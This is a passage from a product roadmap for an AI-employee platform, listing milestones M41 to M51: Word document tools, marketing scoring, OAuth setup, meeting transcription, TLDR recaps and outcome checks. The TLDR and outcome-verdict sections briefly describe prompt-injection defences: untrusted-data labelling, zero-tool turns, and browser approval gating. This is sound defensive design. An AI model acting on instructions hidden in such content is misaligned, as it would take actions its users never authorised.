      size that is not a size, a character no shipped face can render — all
      refused before a single mark is made, because a half-answered form is
      harder to recover from than a refused one. A placement that is merely
      suspicious, like an answer running off the edge, is drawn and returned in
      `warnings`: only the caller knows whether it meant it, and nobody
      re-reads a form they asked an employee to fill.
- [x] **The font stack came out of signing, not out of nowhere.** Noto Latin,
      Arabic and SC, picked per character with coverage checked before
      anything is drawn, now shared by both subsystems instead of duplicated —
      one implementation, so a bug in glyph fallback is one bug rather than the
      kind that only shows up on the one form answered in Arabic.
- Next: detect ruled lines and boxes, not just text. Labels carry most forms,
  but a bare grid of boxes with a heading above it still needs a human to say
  where column three starts.

### M41 — Word documents ✅

A `.docx` handed to an AI Employee came back as "Binary or unsupported type".
Not a partial reading, not a warning — nothing at all, because the attachment
layer knew how to decode text, JSON and PDF and treated everything else as
opaque bytes. The employee did the only sensible thing with what it could see:
it reported that the document parser returned no readable text, that it had no
DOCX-editing tool, and asked for the same file as a PDF instead. The file was
already there. It was a questionnaire, and answering questionnaires is the job.

Word is where the paperwork of a company actually lives — questionnaires,
order forms, contracts under redline, the report someone wants by Friday. So
the format gets the same treatment PDF got in M40: read what is there, change
it in place, and write a new one when the deliverable is a document rather
than a message.

- [x] **A Word document is text now, everywhere, before any tool is called.**
      `attachmentText.ts` extracts `.docx` the way it extracts PDF, so a
      questionnaire uploaded into chat or opened off an email is simply in
      front of the employee. `fetch_web_page` reads one served over HTTP, and a
      `.docx` ingested as a Resource stores its prose instead of the mojibake
      a UTF-8 decode of a zip produces — which search was happily matching
      against.
- [x] **`read_docx` returns structure, not just prose.** Every paragraph and
      table cell carries an id (`p7`, `t1r2c3`), because an edit has to name
      where it goes and "the third blank line after question one" is not an
      address. Headers, footers, footnotes and comments are read alongside the
      body: a questionnaire's answer boxes live in a header often enough that
      a body-only reader would call the document empty, which is the exact
      failure this milestone exists to end.
- [x] **`edit_docx` changes a document without rewriting it.** Every operation
      becomes a splice into the original XML, so the bytes nobody touched are
      the same bytes — the fonts, the numbering, the styles, the revision ids
      Word hangs off every element. Round-tripping through a general-purpose
      XML library instead would reorder attributes, normalize away
      `xml:space="preserve"` and drop vendor extensions: damage that is
      invisible in a diff and obvious in Word. New text inherits the
      formatting around it, so an answer arrives in the document's own face
      rather than announcing that a machine typed it.
- [x] **Matching happens on the paragraph, not on the element.** Word splits a
      sentence across runs wherever a spell-check boundary or a saved revision
      falls, so `Full name:` routinely lives in four `w:t` elements and a
      search that looked at one at a time would report no match on a phrase
      plainly visible on the page. Text is stitched first and written back
      into the runs the match actually covered.
- [x] **The batch is all or nothing.** Every id is resolved against one
      reading of the file before a byte is written, and if any of them fails
      nothing changes and every problem comes back together. A run of eight
      answers that quietly skipped the two with wrong ids hands a human a
      questionnaire that looks finished and is not — which is the same reason
      `overlay_pdf_text` refuses before it draws.
- [x] **Real fields are set as fields.** Modern content controls and Word 97
      form fields both, including checkboxes and dropdowns, addressed by id or
      by the name a human sees in Word. A dropdown only accepts one of its own
      options, a checkbox takes `checked` rather than a string, and an
      ambiguous name is refused rather than guessed at.
- [x] **`create_docx` writes one from Markdown**, because Markdown is the only
      document format a model reliably produces and base64 of a zip is not.
      Headings, lists, tables, quotes, code, emphasis and links map onto real
      Word constructs — a heading is `Heading1`, a list carries a numbering
      definition — so the recipient gets a document they can restyle and keep
      working in. Each ordered list gets its own numbering id so a second list
      restarts at 1 rather than continuing the first.
- [x] **The refusal says what the file actually is.** A legacy `.doc`, a
      spreadsheet, a Pages export, a PDF opened by mistake — each gets its own
      sentence and, where there is one, the fix. "No readable text" was the
      message that started this milestone; it is not a message any of these
      tools will send.
- [x] **No new dependency.** `jszip` was already in the tree and does the
      packaging; the OOXML reader is 300 lines of this repo's own, written for
      exact offsets rather than for generality. The three tools extend the
      existing `files` domain rather than opening a `documents` one, and the
      `find_tools` footer ceiling moves 40 characters with the reason recorded
      beside it.
- Next: images and comments. An employee can read a document's comments today
  only as text with no thread structure, and cannot answer one; and a report
  that would be clearer with the chart in it still ships the chart separately.

### M42 — Marketing that decides ✅

M35 built the agency's filing cabinet and stopped there. A Campaign recorded a
target as free text nobody compared anything to, the performance snapshots an
AI Employee dutifully recorded were visible to no human anywhere in the
product, and the brief could be written once and never edited again — so the
strategy on screen drifted from the campaign actually running, and the only way
to learn whether the money was working was to ask the employee that spent it.
The workspace had every fact and produced no judgement.

- [x] **Targets are scored, not stored.** A success metric now resolves against
      a measurable catalogue — conversions, CPA, ROAS, conversion value,
      conversion rate, CTR, CPC, CPM, clicks, impressions, spend — with the
      target read in the metric's own unit and `targetDirection` deciding which
      side wins, defaulted from the metric because costs are met by going low
      and returns by going high. A company can still name its own metric; the
      workspace then says plainly that it cannot judge it rather than showing a
      goal nobody checks. `marketingMetrics.ts` is pure and feeds the UI and the
      AI tools from one function, so a Routine and a human never disagree about
      arithmetic.
- [x] **The command center leads with what is wrong.** Off target, spending
      ahead of plan, underdelivering, active with nothing recorded, running on a
      readout three days stale, active with no live Creative, Creative waiting
      on review, an Experiment two weeks past its start with no decision — each
      with the numbers in the sentence and a link to the Campaign. Four counters
      told you the agency existed; this tells you what it needs.
- [x] **The Campaign page that was missing.** Full brief editing after
      creation, the Connection and platform ids that were unreachable from the
      UI entirely, scored metrics over a 7/30/90-day window, the attention list,
      every recorded readout, and a form to record one by hand. Money in minor
      units end to end, converted once at the edge.
- [x] **Readouts that cannot be counted twice.** Recording a period that already
      has a readout restates it — the old row is kept, marked superseded, and
      drops out of every aggregate — which is what a crash-retried Routine and a
      late-settling platform both need. A partially overlapping window is
      refused outright, because a daily readout plus the weekly one containing
      it is the same money twice and nothing downstream can separate them again.
      Live windows for one Campaign therefore never overlap, which is what makes
      summing them safe.
- [x] **States that mean something.** Campaign, Creative and Experiment
      transitions are enforced, so `operate` cannot walk a half-written draft
      past the ready state that exists to force a review. Creative goes live
      only under a live Campaign — the platform enforces that physically, and
      the one screen a human checks should not claim otherwise.
- [x] **A decision that is carried out.** Deciding an Experiment can apply its
      own verdict: the winner goes live, or waits at approved when the Campaign
      is not running, and the variants that were serving against it retire.
      Rejected and retired variants are left alone, because a test result is not
      a reason to quietly undo a human's no.
- [x] **No new tools.** The same twelve deferred Marketing tools now return the
      scoring, so the autonomous loop reads its evidence already judged instead
      of recomputing it per run. `MarketingPages.tsx` split into one file per
      screen plus shared primitives.
### M43 — Instance-wide OAuth apps ✅

Connecting an email account was the hardest thing in the product, and the hard
part was never the consent screen. Every Connection carried its own OAuth
credentials, so the first person who wanted their inbox in Genosyn had to open
Google Cloud Console, create a project, enable the Gmail API, configure a
consent screen, register a Web OAuth client, copy a redirect URI back and
forth, and paste an ID and a secret into a form — before seeing a single email.
Then the next mailbox did it again, and so did the next company. A self-hosted
install made one person do it once; a shared SaaS made every customer do it.

The client belongs to the deployment, not to each Connection.

- [x] **A master admin registers each OAuth app once**, at
      **Admin → Integrations**. Google leads the list because email is why
      most installs arrive. Each card carries the provider's console link, the
      ordered setup steps, and the exact redirect URI to allow-list — resolved
      from the instance public URL, with a copy button, so the value that has
      to match on both sides is never retyped.
- [x] **After that, connecting is one click.** The connect modal drops the
      Client ID and Secret fields entirely and says so; the user picks which
      products the connection may touch and approves on the provider's own
      screen. The catalog card reads `OAuth · 1-click`. The onboarding Gmail
      step shares the modal, so first-run setup gets it without a second
      implementation.
- [x] **One registration covers every integration sharing the app.**
      Registering `google` unlocks Workspace, Analytics, Search Console, and
      Ads together, and the admin card derives that list from the provider
      registry so the copy cannot drift as integrations are added. Six apps are
      registerable: Google, GitHub, Microsoft, LinkedIn, Reddit, X.
- [x] **Per-Connection credentials still win, and still work.** A company that
      needs its own client — a Workspace tenant with its own consent policy, a
      separate quota — picks **Use my own OAuth client instead** on the connect
      form and the credential fields come back. A pair is taken whole or not at
      all: a client id with no secret falls back to the registered app rather
      than being completed from it, because a mixed pair passes consent and
      only fails at the token exchange, after the human has already approved.
- [x] **No schema change.** The registry is a single JSON `AppSetting` row, the
      same mechanism the global SMTP override and the VAPID keypair use.
      Secrets are encrypted at rest with the instance key and are write-only
      across the API boundary — the admin view returns the client id and
      whether a secret is on file, never the secret. Saving with a blank secret
      keeps the stored one, so a mistyped client id is fixable alone. A corrupt
      or hostile settings row degrades to "nothing registered" rather than
      breaking every connect flow on the install.
- [x] **Removing a registration cannot break a live Connection.** Each
      Connection persists the credentials it was created with, so token refresh
      is untouched by anything that happens here afterwards. Rotating the
      secret is recoverable in place: reconnect recognises a Connection whose
      client id matches the registration as *being* the instance app and takes
      the current secret, while a Connection that brought its own client keeps
      it. Without that, rotating would break every mailbox on the instance with
      no fix short of delete-and-recreate, which revokes the whole team's
      grants.
- [x] **The settings row is written with a compare-and-swap**, the same
      conditional write `persistConnectionConfigIfCurrent` uses for Connection
      credentials, and is deliberately uncached. One row holds every app, so a
      save is a read-modify-write of the whole map: a cached snapshot would let
      one replica erase registrations it never saw, or keep minting authorize
      URLs from a client an admin had already revoked.
- Next: the zero-Google path. IMAP/SMTP with an app password would remove the
  cloud console from the picture entirely and reach Fastmail, Zoho, and
  self-hosted mail — but the `Mail*` subsystem is Gmail-shaped rather than
  merely Gmail-transported (a monotonic `historyId` cursor, opaque thread and
  draft ids, labels as the only folder mechanism), so it needs a real backend
  seam under `sync.ts` / `actions.ts` / `store.ts` first.

### M44 — Calendar & Meetings ✅

A company's calendar was the one system of record Genosyn could see and could
not use. The Google Connection has carried the Calendar scope since M25, and
`calendar-tools.ts` — six working tools, list through delete — sat in the tree
imported by nothing at all. Meanwhile the most valuable half-hour a revenue
team has is the call itself, and nothing about it reached the CRM: the meeting
happened, somebody meant to write it up, and three days later the Deal's
timeline said the last thing that touched this customer was an email.

Mail already solved this exact problem. Sync mirrors the mailbox, `mailLink.ts`
matches participants against known Contacts, and the timeline fills itself
without anybody doing data entry. This milestone does the same thing for the
calendar, and then carries it one step further: a call that has a transcript
gets read by the AI Employee that owns it, and the follow-ups it promises land
as real, dated, assigned rows in the queue a human already works from.

- [x] **The Calendar tools are connected.** `calendar_list_calendars`,
      `calendar_list_events`, `calendar_get_event`, `calendar_create_event`,
      `calendar_update_event` and `calendar_delete_event` now dispatch from the
      umbrella `google` provider behind a `calendar` scope check. They were
      written, tested against the API shape, and orphaned; wiring them in was
      four lines and is why an AI Employee can move a meeting today.
- [x] **A Meetings section, backed by a real mirror.** `CalendarAccount` binds
      a calendar to a `google` Connection and borrows its token lifecycle the
      way `MailAccount` does — no second credential path. `CalendarEvent` is a
      queryable local copy, so "which meetings in the next hour have a
      conference link and an outside attendee" is one indexed scan rather than
      an API call per pass per account.
- [x] **Incremental sync, and the 410 that is not an error.** Google hands back
      a `syncToken` and returns only what changed. It also expires that token
      whenever it decides the window is too old, which arrives as a 410 GONE
      and means "re-list from scratch", not "something broke" — the sync clears
      the cursor and retries once rather than parking the account in `error`.
      A moving `windowDays` bound keeps 2009's standups from being mirrored at
      all.
- [x] **Transcripts link themselves to customers.** Attendee addresses are
      matched against existing Contacts and written onto the Contact, Deal and
      Account timelines as `meeting` activities, keyed on a new
      `Activity.meetingId` so a re-run writes nothing twice. It follows
      `mailLink.ts` rule 1 exactly — **we link to Contacts that already exist,
      we never create one.** A calendar is mostly colleagues, vendors,
      recruiters and one-off strangers, and auto-creating a Contact per
      attendee is the same trap there as it is in a mailbox.
- [x] **The AI Employee writes the follow-ups.** When a transcript lands, the
      notetaker employee is handed the call and its Revenue context under
      `toolAuthority: "employee"` — the seam sequences and signals already use
      — and files a summary plus dated, owned action items through
      `createFollowUpTask`. They are `task` activities, which means they arrive
      in the Follow-ups queue humans already work from rather than in a second
      inbox nobody opens.
- [x] **Recording is a seam, not a single ingress.** A recording uploaded to a
      meeting or a transcript pasted into it works on every platform and every
      deployment, including when live presence is blocked by a host policy.
      Transcription runs through any
      OpenAI-compatible `/v1/audio/transcriptions` endpoint using credentials
      already encrypted on the `AIModel` row, so a self-hoster points it at a
      local whisper server and no third party sees the audio. There is no new
      model credential path or credential store.
- [x] **Auto-record is off, and stays off.** A recorder that turns itself on is
      the one behaviour here that can embarrass a company, because the people
      on the other end agreed to nothing. Joining is opt-in per calendar, and
      even then only for meetings with an attendee outside the company's own
      domains unless somebody deliberately widens it.
- [x] **The notetaker joins Google Meet itself.** Shortly before a qualifying
      call, the built-in recorder enters as a disclosed guest, waits for host
      admission, records call audio into the App's private meeting storage,
      then hands the result to the existing transcription pipeline. The
      standard Docker image carries Chrome, PulseAudio and ffmpeg; source
      installs must provide them. Guest admission and Google Workspace
      sign-in policies remain real boundaries, and Zoom, Teams and Webex still
      use the upload or paste fallback.

### M45 — TLDRs ✅

AI Employees can work all day without producing one place a human can scan in
two minutes. Their Runs and journal entries accumulate, and useful updates land
across Workspace, but reading every transcript and channel defeats the point of
delegating the work. TLDRs turn that company-visible activity into a periodic,
durable recap without widening who can see private conversations or giving the
summarizer another route to act.

- [x] **One company schedule, one chosen AI Employee.** `TldrSettings` stores
      whether TLDRs are enabled, the employee that writes them, and one of five
      fixed cadences: every 4, 8, or 12 hours, daily, or weekly. When no TLDR
      policy has been saved, the first hired AI Employee becomes the writer and
      starts an enabled daily schedule by default. The employee must still
      belong to the company and have a connected active AI Model before a recap
      can run. Owners and admins configure the schedule or choose **Generate
      now**; ordinary Members cannot change company automation.
- [x] **The source window is useful and deliberately narrow.** Each pass reads
      public Workspace messages, company-visible journal entries, and terminal
      Routine Run output from its bounded period. Private channels, DMs, and
      direct employee chat are excluded before any text reaches the model, so a
      recap visible to the whole company cannot launder a private conversation
      into public copy.
- [x] **Summarizing grants no tools.** The chosen employee's connected active
      model receives a bounded snapshot through the restricted agent seam. The
      snapshot is labelled as untrusted data and the turn exposes only the
      structured TLDR submission tool — no coding, browser, Genosyn, Integration,
      or company MCP tools — so an instruction hidden in a message cannot make
      the summarizer take an action.
- [x] **History is durable; empty periods are not.** Every completed recap is a
      `Tldr` row with its covered window and generated markdown. A window with
      no eligible activity writes nothing, leaving Home and the history free of
      empty boilerplate. The replica-wide scheduler lease and a durable due
      claim keep two App replicas from producing the same recap.
- [x] **Reading is per Member.** The newest unread TLDR appears on Home and the
      full generated history lives in the TLDRs section. Dismiss writes a
      `TldrDismissal` for that Member only: the recap leaves their Home page but
      remains readable in history and visible to every colleague who has not
      dismissed it.
- [x] **TLDRs are a first-class product section.** A top-level nav entry opens
      the company history, schedule, employee picker, next-run state, and
      Generate-now action. Empty, loading, error, disabled, mobile, dark-mode,
      and live-update states follow the same quiet Linear × Notion language as
      the rest of the App.
- [x] **Question cards, answered beside the brief.** A recap says what
      happened; the questions a human has next — what to improve, what to stop
      — are `TldrQuestion` cards attached to the briefing rather than folded
      into it. Each card carries its own conversation and is company-visible
      like the briefing, removable by the Member who asked it or by an owner or
      admin. Its opening answer runs the same restricted, zero-tool path the
      briefing itself uses, so asking a question is never a route to making the
      summarizer act, and the recap reaches the model only as server-composed
      untrusted reference data.
- [x] **Discussion happens on the TLDR page, not in a Chat window.** Replying
      on a card runs the ordinary chat seam under the asking Member's own
      delegated authority, so a proposal can become the thing itself — "add a
      Routine for that" writes the Routine. Company automation stays
      owner/admin-gated: an ordinary Member gets the proposal and is told who
      must run it, rather than a refusal from inside a tool call. Each turn is
      persisted before the model starts, so a dropped stream or a restart
      resolves to a real answer instead of a permanent spinner. A removed
      writer leaves existing cards readable and refuses new questions.
- [x] **Standing questions, answered before anybody asks.** A company
      configures up to eight `TldrStandingQuestion` rows at TLDR settings —
      ordered, individually pausable, saved with the schedule in one write.
      The moment a briefing goes ready it hands off to a background pass that
      answers each one on the same restricted, zero-tool seam and posts it as
      its own card beneath the brief, so the answers are waiting rather than
      being something a human has to remember to ask for. `Tldr.standingAnsweredAt`
      is the durable cursor: claimed before the first model turn, so a restart
      mid-pass resumes through a bounded heartbeat sweep instead of answering
      the first question twice, and questions added today never back-fill
      briefings already read.
- [x] **Answers carry buttons, and a button is not a privilege.** A second
      restricted turn — one submission sink, no other tools — turns a finished
      answer into at most three `TldrQuestionAction` rows. Each stores the
      button label and the whole sentence of what pressing it asks for, and
      both are shown before anything runs, because the model wrote them after
      reading untrusted source data: the guarantee is not that a proposal is
      trustworthy, it is that what a Member authorizes is exactly what they
      read. Pressing replays that sentence through the ordinary discuss seam
      under the pressing Member's own authority; `routine` actions are refused
      at the route for anyone but an owner or admin, not merely greyed out. The
      claim is guarded so two Members pressing at once produce one turn, a
      failed turn returns the button to the shelf, and a restart mid-press
      releases it rather than leaving it unpressable. Proposing never risks the
      answer — it is already saved when the second turn runs.

### M46 — The employee page is Chat and Settings ✅

The per-employee sidebar had grown to nine entries — Chat, Skills, Routines,
Journal, Handoffs, Memory, Connections, MCP, Settings — and opening a teammate
looked like opening a filing cabinet. Eight of the nine were things you set up
once and rarely revisit; only Chat is what you came for. So the rail is gone.

- [x] **Two destinations.** `/employees/:empSlug` renders no sidebar at all.
      `EmployeeHeader` — the back link, the avatar, the name, and a Chat /
      Settings switch — is rendered by both the chat and the Settings page, so
      the bar never moves between them. Chat keeps its own conversation rail
      and folds its thread title into that one header instead of stacking a
      second bar under it.
- [x] **Everything else lives under Settings**, grouped so twelve entries stay
      scannable: **Employee** (General, Soul, Model, Memory), **Work** (Skills,
      Routines, Journal, Handoffs), **Access** (Connections, MCP, Browser,
      Integrations). Journal / Handoffs / Memory / Connections / MCP became
      children of the `settings` route; each sub-page titles itself, which is
      what lets Handoffs, MCP and Connections keep the primary action they hang
      off `TopBar.right`.
- [x] **Skills, Routines and Integrations stay company-level** and say so — a
      corner arrow marks the three entries that leave the employee, and each
      carries a tooltip for where it actually lands, since Skills and Routines
      filter to this employee and the Integrations catalog does not.
- [x] **Old URLs keep answering.** `/employees/:empSlug/{journal,handoffs,
      memory,connections,mcp}` redirect to their `settings/` home, query string
      intact, as siblings of the existing Skills / Routines redirects. Inbound
      deep links from Inbox, the chat action pills and Repository access were
      repointed; the mail draft author's routine chip, dead since M23, now
      resolves too.
- [x] **Delete employee** moved from the sidebar footer to a danger zone at the
      bottom of Settings → General — past everything you might have opened the
      page to change, rather than one click from Chat.
- [x] On a phone the settings nav collapses to a horizontally scrollable row of
      pills that scrolls the entry you are on into view, and the header wraps a
      wide action onto its own line so the Chat / Settings switch — the only
      way off Chat — is never the thing that overflows.

### M47 — A document errand an employee can finish ✅

An AI Employee could read a Word contract, quote it, and edit it, and still had
to stop before doing anything with it. Signing takes a PDF Resource and nothing
else, the PDF overlay tools work on pages, and filing a file as a Resource was a
human's job — so "prepare this NDA for signature" came back as a request that a
Member open Word, save as PDF, and upload the result. That is the whole errand
minus the part the employee was hired for, and it is the report this milestone
was built from.

- [x] **`convert_to_pdf`.** A new `files` tool renders a `.docx` / `.docm` /
      `.dotx` / `.dotm` to PDF and returns it as a chat attachment. Headings,
      numbered clauses and their markers, tables, run formatting, embedded
      images, the document's fonts and its own page size and margins all carry
      across. `services/docxToPdf.ts` maps WordprocessingML onto HTML and prints
      it through the Chromium the image already ships — deliberately not a
      headless LibreOffice, which would cost roughly half a gigabyte of image
      for one feature.
- [x] **It says what it could not carry.** The result is a faithful rendition,
      not a re-save from Word, and the difference is reported rather than
      hidden: running headers and footers are not repeated, tracked changes
      render as accepted with deletions left out, footnote markers arrive
      without their notes, and pagination can differ. Each comes back in
      `warnings`, because a converted contract that silently lost its
      confidentiality footer is worse than one that refuses.
- [x] **`create_resource` accepts a file.** `sourceKind: 'file'` with an
      `attachmentId` files the bytes an employee already holds — a PDF a
      customer emailed, a Word document it converted, a form it downloaded —
      as a real Resource with its bytes on disk, its text extracted, and the
      employee recorded as its author. This retires the "file uploads stay
      humans-only" rule from M19 for everything except video, which still needs
      a transcript. Both ingestion paths now share one extractor, so a `.docx`
      cannot mean one thing on the human route and something else on the AI one.
- [x] **The gates that matter did not move.** Filing a Resource is a write, not
      an authority: the employee authors the row (full control of its own,
      teammates at read), tenancy is checked against the attachment's company,
      and the filing and the draft each write an `AuditEvent` and a
      `JournalEntry`. Preparing a signature request still emails nobody, sending
      still needs `send` on an `EmployeeSigningGrant`, and only the named
      recipient can consent or sign. A PDF whose text will not extract — the
      scanned-contract case — is still filed and still usable for signing, and
      the tool says out loud that nobody will find it by searching.
- [x] **Docs and tests.** Word documents and Document signing both document the
      route in; the Resources copy no longer claims file uploads are a human's
      job. The rendition is asserted on the HTML rather than the printed page,
      and the whole errand — Word attachment to signing draft with no human
      touching a file — is covered end to end.

### M48 — Routine folders ✅

M27 gave every resource tags and said so out loud: labels "for grouping
resources without forcing a folder hierarchy." That holds for the question tags
answer — *what is this about?* — and it is still the right primitive for it. It
does not answer the other one. Past a few dozen routines, "All routines" is a
wall of text and the per-employee filter splits it by the wrong axis: nobody
files month-end close under whoever happens to run it. A tag chip narrows a flat
list; it never gives you somewhere to put things. Folders do, and the two are
complementary rather than competing — one folder per routine, any number of
tags.

- [x] **`RoutineFolder`** — company-scoped, nestable to 5 levels
      (`MAX_FOLDER_DEPTH`), with `Routine.folderId` filing a routine in at most
      one. Company-scoped rather than employee-scoped on purpose: a folder
      spanning employees is exactly the grouping the sidebar's roster filter
      cannot express. Slugs are stable across renames like every other slug
      here, so `?folder=<slug>` survives a rename.
- [x] **The tree can't break.** `services/routineFolders.ts` owns every
      invariant — a folder cannot be moved into itself or a descendant, a move
      cannot push a subtree past the depth limit, sibling names are unique
      case-insensitively, and a folder whose parent vanished is shown at the top
      level rather than stranded, and a name can never contain the path
      separator or claim the reserved `unfiled` slug. Covered by service tests
      plus HTTP tests that assert the admin gate, the cross-company 404s, and
      that a bulk move announces itself to live sync.
- [x] **Deleting a folder never deletes routines.** Its routines and subfolders
      are promoted to its own parent — null for a top-level folder, which means
      "unfiled". The confirmation quotes back what will move and where before
      you press it.
- [x] **Sidebar tree** at `AI → Routines`: collapsible, indented by depth,
      per-folder counts including nested routines, an **Unfiled** row, and a
      `⋯` menu per folder for subfolder / rename / move to top level / delete.
      Selecting a folder shows it *and everything beneath it*.
- [x] **Filing an existing library.** `POST /routines/move` moves up to 200
      routines in one checked request, behind an **Organize** mode on the list
      with per-row checkboxes and select-all. A routine is also re-filable one
      at a time from its Settings tab, and creating a routine from inside a
      folder lands it there.
- [x] **AI employees file their own work.** `create_routine` and
      `update_routine` take a `folder` — a name or a `Finance/Month-end` path,
      creating missing segments the way tag names are created; an empty string
      unfiles. `list_routines` / `get_routine` report the path. No new MCP
      tools, so the resident working set (M30) is untouched.
- [x] **`GET/POST/PATCH/DELETE /routine-folders`**, admin-gated for mutations
      like the routine surface itself, documented in the OpenAPI spec, and
      registered for app-wide live sync (M31) under the existing `routine` kind.
- [x] **Search the list.** Folders answer *where does this live* and tags
      answer *what is this about*; both want you to know the answer before you
      can narrow. A search box above the list is the third question — *what was
      that thing called?* — and it matches everything the row already shows:
      name, slug, assigned employee, folder path, tags, and the schedule in
      both dialects — `0 9 * * 1-5` and "Monday" find the same routine, since
      which one someone types depends on whether they write cron for a living.
      Terms are ANDed across fields and folded for case and accents. The health
      counts re-count against the search, so each chip still says what clicking
      it would show. Pure and tested in `client/lib/routineSearch.ts`.

### M49 — Ask AI on a Routine ✅

M25 put an AI chat beside every email and it turned out to be the shape people
actually wanted: the thing you are looking at, and someone who already knows
about it, in the same view. A Routine has the same problem and a worse version
of it. "Why did last night's run fail?" is answered by a transcript nobody
wants to read, sitting one tab away, written by an employee who is right there.
The old answer was to copy the log into that employee's chat and explain which
routine it came from. This is the same panel pointed at scheduled work.

- [x] **`RoutineChatMessage`** — one conversation per Routine, the sibling of
      `MailChatMessage` down to the recovery semantics: the assistant row is
      persisted `working` before the model starts, so the reply belongs to the
      database rather than to one browser tab. A dropped stream, a closed
      panel, or a reload follows the same row to its real answer; boot and
      restore sweeps close out rows a dead process left behind and free their
      reply lease.
- [x] **The employee is handed the routine, not asked to go find it.** Each
      turn injects a freshly built context block: every setting, the schedule
      and what it resolves to, the folder, the brief, the last ten Runs with
      status / duration / exit code / attempt / missed slots, and the tail of
      the newest Run's log. Only `get_routine` is added to the toolset — the
      routine tools are already resident (M30), so the working set is
      untouched.
- [x] **The routine's own employee answers by default**, then whoever answered
      last, with `@slug` to hand the question to somebody else — and the model
      a turn ran on is persisted, so reopening the panel days later does not
      quietly continue on a different brain.
- [x] **Asking is not editing.** `routes/routineAssistant.ts` mounts ahead of
      `routinesRouter` so an ordinary Member can ask about a routine while
      mutating one still needs an admin; the turn runs with that Member's own
      authority, so anything the employee *does* is intersected with what they
      are allowed to do, and the briefing tells it to describe a change rather
      than make one. A route test mounts both routers in production order and
      asserts both halves.
- [x] **A resizable rail on the routine page**, sharing the `SidePanel`
      primitives with the browser and repository panels, collapsing to a spine
      and taking the pane on a narrow window. Deleting a routine takes its
      conversation with it.
### M50 — Outcome truth, run economics, loud failures ✅

A Run's `completed` only ever meant "the agent loop returned without a provider
error" — even step-limit exhaustion finalized green — and a company that
believed its AI staff was working could have three Routines silently wedged: a
failed Run raised no bell, a gated tick whose Approval nobody answered was
simply lost, an unanswered Decision blocked its employee forever, a Handoff was
a note on a desk until the receiver's next spawn happened to read its journal.
This milestone is the eyes and the alarm bells: the platform starts telling
good work from confident failure, counting what work costs, and refusing to
let stalled work stay silent.

- [x] **Acceptance criteria on Routines** (`Routine.acceptanceCriteria`,
      Settings → Outcome check). Plain-language definition of done, folded into
      every Run brief so the employee aims at the same bar it is graded
      against. Empty (the default) keeps exactly the old behaviour.
- [x] **Outcome verdicts.** After a completed Run on a Routine with criteria, a
      restricted zero-tool checker (the TLDR seam's shape: one submission tool,
      transcript as untrusted evidence) grades the transcript and stamps
      `Run.outcomeVerdict` (`achieved` / `unclear` / `off_goal`) +
      `outcomeNote`. Status is untouched — `completed` keeps meaning "the loop
      returned"; the verdict is the second, honest axis. Verdicts render as
      chips on run lists and the log modal, land in the journal entry (so the
      7-day injection finally teaches whether work *worked*), and an off-goal
      Run notifies admins and the employee's managing Member.
- [x] **Step-limit exhaustion is a failure.** `stopReason` now rides the agent
      result; a Run stopped by the runaway backstop finalizes `failed` with the
      reason in the transcript, and enters the ordinary retry policy.
- [x] **Token accounting.** `Run.tokensIn` / `tokensOut` sum the provider's own
      per-turn counts (the verdict turn included); Usage rolls them up per
      company / employee / Routine with token columns and totals. Dollar costs
      stay deliberately uncomputed — pricing is the operator's contract.
- [x] **Failed Runs page a human.** Terminal `failed` / `timeout` /
      `interrupted` with no retry owed → bell + push (`run_failed`) to
      owners/admins and the employee's managing Member, deep-linked to the Run
      log. Mirrors the Home panel's retry-aware quieting.
- [x] **The stall sweep** (`services/escalations.ts`, on the scheduler
      heartbeat). Approvals pending past 24h, Decisions blocking past 24h, and
      Handoffs past their `dueAt` re-page the humans who can unblock them,
      exactly once. "Once" is a durable `stallRemindedAt` stamp on the row,
      claimed with a conditional UPDATE — not a lookup in the notification
      feed, because a Member can delete their own read bells and a deletable
      marker would re-arm the nag forever; and because the stamp is part of the
      query, the sweep can never wedge behind a page of rows it already
      handled. `Handoff.dueAt` is no longer "unenforced".
- [x] **Audiences are live Memberships.** Nothing clears an employee's
      `reportsToUserId` or a Decision's `assigneeUserId` when that Member is
      removed from a company, and push subscriptions are per-account and
      outlive a membership — so `managingMemberIdForEmployee` now confirms the
      Member is still in the company before returning them, and a Decision
      assigned to someone who has left pages the owners instead. The off-goal
      note is model-written from an untrusted transcript, so it meets the same
      redaction boundary as an Approval summary before it becomes push copy.
- [x] **Handoffs kick off.** Creating a Handoff (MCP or API) immediately briefs
      the receiver in a background session under employee authority — the same
      "go" signal shape as todo assignment and Decision answers — instructed to
      do the work now and settle the row via `complete_handoff` /
      `decline_handoff`. No model → the journal delivery remains the fallback.
- [x] **AI reviewers review.** A todo entering `in_review` with an AI reviewer
      starts a review session ("bots don't get a bell" — they get a session):
      the reviewer verifies the thread's claims with its tools, moves the card
      itself, and — when the assignee is an AI teammate — sends rework back as
      a Handoff, which now kicks off. Three passes cap the AI⇄AI ping-pong,
      counted on `Todo.aiReviewPasses` and claimed with a conditional UPDATE
      rather than inferred from the comment thread (an AI reviewer also
      comments when a human @-mentions it, so counting comments would let
      ordinary chatter silently disable reviewing). An employee never reviews
      work it was itself assigned.
- [x] **Safer browser default.** `browserApprovalRequired` defaults **on** for
      new employees — the open web is where hostile content meets side effects,
      so the gate is now opt-out. Existing employees keep their stored setting.

Deliberately *not* in M50, each big enough to be its own milestone: taint-aware
turn policy (untrusted content escalating side-effecting tools one rung),
Approval-gated self-modification (Soul/Skill/Routine edits), Goals/KPIs, Stripe
payment links on invoices, and bulk knowledge/CRM migration imports. They are
the next rungs of the same ladder — M51 and M52 below are the first two.

### M51 — Goals & Charter ✅

The company's purpose becomes machine-readable. Every prioritization call an
employee faces today requires asking a human, because nothing above a Routine
says what the company is trying to achieve: `Company.mission` and
`Company.vision` are shipped columns captured by onboarding and injected into
no prompt at all, and M50's verdicts grade Runs against per-Routine criteria
with no notion of what the work was *for*. A **Goal** is a measurable
objective: a target value with a direction, an optional deadline, an optional
owning AI Employee, an optional parent (cascading company → employee), and a
metric source — manual (a number an employee or Member updates, the V1-backlog
"Goals / KPIs" item) or an Explore Chart whose first numeric cell is the
current value, refreshed on the scheduler heartbeat. Routines gain a nullable
`goalId`, so scheduled work declares what objective it serves; the Run brief
and the outcome checker both see the goal, so verdicts finally grade
contribution and not just compliance.

- [x] `Goal` entity (company-scoped; slug; title/description; parent goal;
      owning AI Employee; metric kind `manual` | `chart` with Chart binding;
      start/target/current values with `increase_to` / `decrease_to`
      direction; unit label; due date; status `active` / `achieved` /
      `missed` / `archived`) + `Routine.goalId`, in both migration streams
- [x] Goals service: progress computation, chart-bound value refresh through
      the Explore executor (company-scoped, first numeric cell), heartbeat
      sweep that refreshes chart goals and settles `achieved` / `missed`
      transitions exactly once, with owner notifications
